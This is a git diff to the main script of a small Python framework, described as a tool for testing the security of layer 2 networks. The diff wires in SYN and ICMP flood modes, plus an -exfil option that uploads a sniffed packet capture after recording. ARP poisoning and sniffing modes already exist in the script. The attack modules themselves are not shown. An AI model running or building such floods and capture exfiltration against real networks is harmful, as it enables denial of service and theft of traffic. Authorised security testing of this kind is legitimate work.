@@ -1,12 +1,12 @@
 #!/usr/bin/python3
 #from core.DHCP.dhcp import dhcpAttacks
-#from core.DOS.dos import DoS
 #from core.ICMP.icmpRedirect import redirect
-#from core.SNIFFER.exfiltration import pcapExfiltration
-import argparse
 
+import argparse
 from core.ARP.arp import arpPoison
 from core.SNIFFER.sniffer import sniffer
+from core.DOS.dos import DoS
+from core.SNIFFER.exfiltration import pcapExfiltration
 
 def main():
     parser = argparse.ArgumentParser(description = "A small framework for testing a network's security of layer 2 technologies.", usage = "Hello world!")
@@ -16,6 +16,7 @@ def main():
     parser.add_argument("-tL", help = "List of Target IP Addresses for ARP (list)", nargs = "+", type = str, dest = "targetIPList", action = "store") #IF TRUE THEN NULL -tIP
     parser.add_argument("-bpf", help = "Berkeley Packet Filter variable for Sniffer (str)", type = str, dest = "bpf", action = "store")
     parser.add_argument("-c", help = "Total packet count for Sniffer (int)", type = int, dest = "count", action = "store")
+    parser.add_argument("-exfil", help = "completes for Sniffer file (str)", const = True, nargs = "?", type = str, dest = "exfil", action = "store")
 
     
     args = parser.parse_args()
@@ -60,5 +61,17 @@ def main():
     if args.attackType == "sniffer_file" or args.attackType == "SNIFFER_FILE":
         pktSniffer = sniffer(args.count, args.bpf)
         pktSniffer.sniffToFile()
+        
+        if args.exfil == True:
+            exfiltration = pcapExfiltration("PiTak.pcap")
+            exfiltration.upload()
+
+    if args.attackType == "syn" or args.attackType == "SYN":
+        denial = DoS(args.targetIP)
+        denial.synFlood()
+
+    if args.attackType == "icmp" or args.attackType == "ICMP":
+        denial = DoS(args.targetIP)
+        denial.icmpFlood()
 
 main()
